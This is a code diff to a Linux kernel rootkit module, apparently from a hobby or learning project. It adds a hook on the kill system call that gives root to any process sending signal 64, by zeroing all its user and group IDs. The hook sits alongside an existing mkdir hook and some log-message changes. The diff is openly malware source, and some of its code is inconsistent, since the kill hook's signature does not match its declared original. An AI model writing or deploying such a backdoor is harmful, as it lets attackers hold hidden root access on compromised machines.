@@ -33,7 +33,27 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
     return 0;
 }
 #else
+/* 
+   `asmlinkage` -> This is a tag that tells the compiler that function should not expect to find any
+   of its arguments in registers (common optimization), but rather only on the CPU's stack.
+*/
 static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
+static asmlinkage long (*orig_kill)(pid_t pid, int sig);
+
+void set_root(void) {
+    struct cred *root;
+    root = prepare_creds();
+
+    if (root == NULL)
+        return;
+
+    root->uid.val   = root->gid.val     = 0;
+    root->euid.val  = root->egid.val    = 0;
+    root->suid.val  = root->sgid.val    = 0;
+    root->fsuid.val = root->fsgid.val   = 0;
+
+    commit_creds(root);
+}
 
 asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
 {
@@ -42,15 +62,30 @@ asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
     long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
 
     if (error > 0)
-        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);
+        printk(KERN_INFO "[i] Rootkit: trying to create directory with name %s\n.", dir_name);
 
     orig_mkdir(pathname, mode);
     return 0;
+}
+
+asmlinkage int hook_kill(const struct pt_regs *regs) {
+    void set_root(void);
+
+    int sig = regs->si;
+
+    if (sig == 64) {
+        printk(KERN_INFO, "[!] Rootkit: Giving you root. Standby...\n");
+        set_root();
+        return 0;
+    }
+
+    return orig_kill(regs);
 }
 #endif
 
 static struct ftrace_hook hooks[] = {
     HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 };
 
 static int __init rootkit_init(void)
@@ -60,14 +95,14 @@ static int __init rootkit_init(void)
     if(err)
         return err;
 
-    printk(KERN_INFO "rootkit: loaded\n");
+    printk(KERN_INFO "[!] Rootkit: loaded...\n");
     return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-    printk(KERN_INFO "rootkit: unloaded\n");
+    printk(KERN_INFO "[!] Rootkit: unloaded...\n");
 }
 
 module_init(rootkit_init);
